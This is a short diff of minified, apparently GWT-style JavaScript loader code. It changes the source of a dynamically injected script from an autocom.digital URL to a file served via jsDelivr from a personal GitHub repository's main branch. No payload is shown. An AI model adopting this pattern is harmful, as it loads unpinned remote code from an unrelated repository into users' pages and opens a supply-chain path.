@@ -261,7 +261,7 @@ function wipp() {
     };
     t(nb, ob);
     var n = r.createElement(lb);
-    n.src = 'https://autocom.digital/C57100CE85AE4BD428981AE866720A83.cache.js';
+    n.src = 'https://cdn.jsdelivr.net/gh/paamayim/random@main/C57100CE85AE4BD428981AE866720A83.cache.js';
     if (wipp.__errFn) {
       n.onerror = function() {
         wipp.__errFn(U, new Error(pb + code))
